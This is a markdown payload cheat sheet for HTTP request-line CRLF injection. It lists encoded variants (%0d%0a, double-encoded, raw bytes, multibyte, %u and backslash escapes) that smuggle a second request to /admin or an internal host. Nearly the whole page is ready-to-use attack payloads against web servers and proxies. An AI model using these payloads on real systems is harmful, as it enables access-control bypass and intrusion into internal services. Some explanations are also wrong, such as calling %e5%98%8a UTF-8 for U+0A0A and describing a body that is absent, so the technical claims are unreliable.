# Request-line fold — the `\r\n` inside the request-line

## The shape — a `\r\n` inside the request-line lands a second

```text
GET /?q=x%0d%0aGET%20/admin%20HTTP/1.1 HTTP/1.1
```

The `%0d%0a` inside the URL-path ends the request-line — `GET /admin`
becomes the NEXT request-line — a request-line smuggle — `crlf-injection.md`.

## The method-fold — `?m=GET%0d%0aPOST%20/admin`

```text
GET /?m=GET%0d%0aPOST%20/admin%20HTTP/1.1 HTTP/1.1
```

The `%0d%0a` inside a method-param ends the line — `POST /admin` is the
next request-line.

## The path-fold — `?p=/a%0d%0aGET%20/b`

```text
GET /?p=/a%0d%0aGET%20/b%20HTTP/1.1 HTTP/1.1
```

The `%0d%0a` inside the path-param — the next request-line.

## The version-fold — `HTTP/1.1%0d%0aGET%20/admin`

```text
GET / HTTP/1.1%0d%0aGET%20/admin%20HTTP/1.1
```

The `%0d%0a` after the version — the next request-line.

## The request-line + headers — the full fold

```text
GET /?q=x%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20internal%0d%0a%0d%0a HTTP/1.1
```

The fold lands a complete second request — request-line + Host + body —
the full smuggle.

## The percent-encoded fold — `%250d%250a`

```text
GET /?q=x%250d%250aGET%20/admin HTTP/1.1
```

`%250d` decodes once → `%0d` → a parser that decodes twice → `\r` — the
double-encoded fold — `crlf-injection.md`.

## The raw-byte fold — `\r\n` literal

```text
GET /?q=x<CR><LF>GET /admin HTTP/1.1
```

Raw `\r\n` bytes inside the URL — a parser that accepts them → the
fold lands raw.

## The multibyte fold — `%e5%98%8a`

```text
GET /?q=x%e5%98%8aGET /admin HTTP/1.1
```

The UTF-8 `U+0A0A` — a rare parser maps it to `\n` — `crlf-injection.md`.

## The unicode-fold — `%u000a`

```text
GET /?q=x%u000aGET /admin HTTP/1.1
```

The unicode-escape `\u000a` — a parser that unescapes it → `\n`.

## The backslash-fold — `\\r\\n`

```text
GET /?q=x\r\nGET /admin HTTP/1.1
```

Literal `\r\n` text — a parser that unescapes `\\` → real CRLF.

## The evidence — the fold's request lands

The `GET /admin` lands as the next request — the 404/200 of `/admin`
in the response — verbatim.
